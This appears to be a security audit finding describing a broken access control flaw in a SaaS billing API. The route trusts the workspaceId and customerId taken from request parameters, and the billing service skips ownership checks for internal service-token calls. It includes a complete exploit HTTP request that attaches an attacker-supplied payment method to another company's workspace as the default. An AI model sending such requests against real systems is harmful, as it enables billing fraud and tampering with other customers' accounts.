diagnosis: The payment method attachment route receives workspaceId and customerId directly from request parameters and passes them to the shared monorepo billing client. Because the internal client authenticates with a trusted machine-to-machine service token, the downstream billing microservice skips ownership verification. An attacker can attach payment instruments or mutate billing profiles of arbitrary enterprise workspaces.
exploit_request:
POST /api/workspaces/ws_enterprise_acme_corp/payment-methods HTTP/1.1
Host: portal.cloudsaas.com:8081
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"customerId": "cus_target_corp_9941", "paymentMethodToken": "pm_tok_test_card_123", "setAsDefault": true}
